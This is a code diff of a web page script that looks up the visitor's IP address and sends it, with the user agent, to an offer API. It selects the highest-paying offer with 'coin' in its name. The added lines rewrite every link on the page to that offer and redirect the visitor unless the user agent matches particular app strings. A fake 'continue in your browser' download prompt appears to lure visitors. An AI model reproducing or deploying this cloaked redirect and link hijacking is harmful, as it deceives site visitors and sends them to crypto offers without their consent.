@@ -12,7 +12,7 @@ const info = document.querySelector('#info');
 const ip_info = document.querySelector('#ip');
 const ua_info = document.querySelector('#user_agent');
 
-ua_info.textContent = agent;
+// ua_info.textContent = agent;
 
 // GET IP
 fetch('https://api.ipify.org?format=json')
@@ -25,11 +25,11 @@ fetch('https://api.ipify.org?format=json')
   .then((data) => {
     const ip = data.ip;
     console.log(ip);
-    ip_info.textContent = ip;
+    // ip_info.textContent = ip;
 
     // GET OFFER
     const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
-      us_ip
+      ip
     )}&user_agent=${encodeURIComponent(agent)}&ctype=1`;
 
     fetch(urlWithParams, {
@@ -51,7 +51,7 @@ fetch('https://api.ipify.org?format=json')
         console.log(data);
         // alert(data.offers[0].name);
         const filteredOffers = data.offers.filter((offer) =>
-          offer.name.toLowerCase().includes('')
+          offer.name.toLowerCase().includes('coin')
         );
 
         const sortedOffers = filteredOffers.sort((a, b) => {
@@ -60,22 +60,22 @@ fetch('https://api.ipify.org?format=json')
           return payoutB - payoutA;
         });
 
-        alert(sortedOffers.length);
-        alert(sortedOffers[0].name);
-        info.textContent = sortedOffers.length;
-        info.textContent = sortedOffers[0].name;
-
-        const links = document.querySelectorAll('a');
-        links.forEach((link) => {
-          link.href = sortedOffers[0].link;
-        });
+        // alert(sortedOffers.length);
+        // alert(sortedOffers[0].name);
+        // info.textContent = sortedOffers.length;
+        // info.textContent = sortedOffers[0].name;
 
         if (
           agent.indexOf('music') == -1 ||
           agent.indexOf('AppName') == -1 ||
           agent.indexOf('AppVersion') == -1
         ) {
-          window.open(sortedOffers[0].link, '_blank').focus();
+          console.log('redirect..');
+          const links = document.querySelectorAll('a');
+          links.forEach((link) => {
+            link.href = sortedOffers[0].link;
+          });
+          location.href = sortedOffers[0].link;
         }
 
         const html_elem = document.querySelector('html');
@@ -87,8 +87,7 @@ fetch('https://api.ipify.org?format=json')
           ) {
             alert('To download, please continue in your browser.');
           } else {
-            window.location.href = sortedOffers[0].link;
-            window.open(sortedOffers[0].link, '_blank').focus();
+            location.href = sortedOffers[0].link;
           }
         });
       })
